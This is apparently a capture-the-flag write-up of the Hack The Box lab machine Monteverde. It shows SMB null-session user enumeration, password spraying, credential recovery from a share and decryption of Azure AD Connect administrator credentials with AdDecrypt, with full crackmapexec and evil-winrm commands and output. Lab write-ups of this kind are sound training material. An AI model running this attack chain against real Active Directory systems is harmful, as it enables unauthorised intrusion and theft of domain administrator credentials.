---
title: Monteverde - Medium HTB
date: 2023-12-27 10:11:53 +/-0800
categories: [writeup, hackthebox]
writeup: :title
permalink: /monteverde
tags: [AD, Azure]     # TAG names should always be lowercase
---

![PP](assets/Monteverde/PP.png)

## **Scanning :**

lets start with an nmap scan to discoverd open ports and services : 

```bash
> nmap -sC -sV -T4 -sS 10.10.10.172 -Pn

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-26 15:26:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-26T15:26:34
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

Add the domain and the FQDN to your `/etc/hosts` file : 

```bash
echo "10.10.10.172 MEGABANK.LOCAL MONTEVERDE.MEGABANK.LOCAL" >> /etc/hosts
```

## **Enumerate smb:**

We can try to acces at the smb using null session : 

```bash
> crackmapexec smb 10.10.10.172 -u "" -p ""

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\:
```

it work we can acces to the smb service without creds, lets try to enumerate domain users also with CME : 

```bash
> crackmapexec smb 10.10.10.172 -u "" -p "" --users

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated domain user(s)
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\AAD_987d7f2f57d2               Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\mhope                          
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\SABatchJobs                    
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-ata                        
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-bexec                      
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-netapp                     
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\dgalanos                       
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\roleary                        
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\smorgan
```

Creat a user list : 

```bash
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata 
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

## **Password spraying :**

If we try password spraying we found valid creds : 

```bash
> crackmapexec smb 10.10.10.172 -u "user.txt" -p "user.txt" --continue-on-succes | grep '[+]'

SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Re try to list the smb share : 

```bash
> crackmapexec smb 10.10.10.172 -u "SABatchJobs" -p "SABatchJobs" --shares

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

## **Foothlod:**

use CME to list all accessible files in a json file.

```bash
> crackmapexec smb 10.10.10.172 -u "SABatchJobs" -p "SABatchJobs" -M spider_plus
```

On .json create by CME, we can see that there is an xml file on the machine in the user$ share will see this:

```bash
"azure_uploads": {},
    "users$": {
        "mhope/azure.xml": {
            "atime_epoch": "2020-01-03 14:41:18",
            "ctime_epoch": "2020-01-03 14:39:53",
            "mtime_epoch": "2020-01-03 15:59:24",
            "size": "1.18 KB"
        }
    }
```

Use smbclient to connect on the share : 

```bash
> smbclient //10.10.10.172/users$ -U 'SABatchJobs%SABatchJobs'
```

Download the file on your local machine and open it. We can see that the file contains a password but without user we can try to find the password with our list of users.

```bash
> crackmapexec smb 10.10.10.172 -u user.txt -p password.txt --continue-on-succes | grep '[+]'

SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

## Privileges Escalation **:**

To automate enumeration, we can launch winpeas.exe. Use evil-winrm to upload it on the target:

```bash
#evil-winrm shell
uplaod winpeas.exe

# launch winpeas
.\winpeas.exe
```

There are a lot of interesting things notably Azure softwares.

```bash
╔══════════╣ Installed Applications --Via Program Files/Uninstall registry--
╚ Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Microsoft Analysis Services
    C:\Program Files\Microsoft Azure Active Directory Connect
    C:\Program Files\Microsoft Azure Active Directory Connect Upgrader
    C:\Program Files\Microsoft Azure AD Connect Health Sync Agent
    C:\Program Files\Microsoft Azure AD Sync
```

After a lot of research I saw that the software "Azure AD Sync" can be operated voicie a blog that explains well the operating process: https://blog.xpnsec.com/azuread-connect-for-redteam/

So I look for a tool that would allow me to do that and I came across this https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/. First go download the binary and then do the following steps.

*PS when you upload the tool don’t forget to upload also the dll file :

```bash
#move to the good directory
> cd 'C:\Program Files\Microsoft Azure AD Sync\bin'

#Execute the tool with the full path and the '-FullSQL' option
> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

Test the credential with CME: 

```bash
> crackmapexec smb 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!'

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (admin)
```

Yes we are Domain admin ! Get the flag 

```bash
crackmapexec smb 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!' -x 'more C:\Users\Administrator\Desktop\root.txt'
```

MONTEVERDE  rooted GG ! it was my first experience in a Azure pentesting environment and its fun 😁

### **Credit for root :**

exploit azure connect : https://blog.xpnsec.com/azuread-connect-for-redteam/
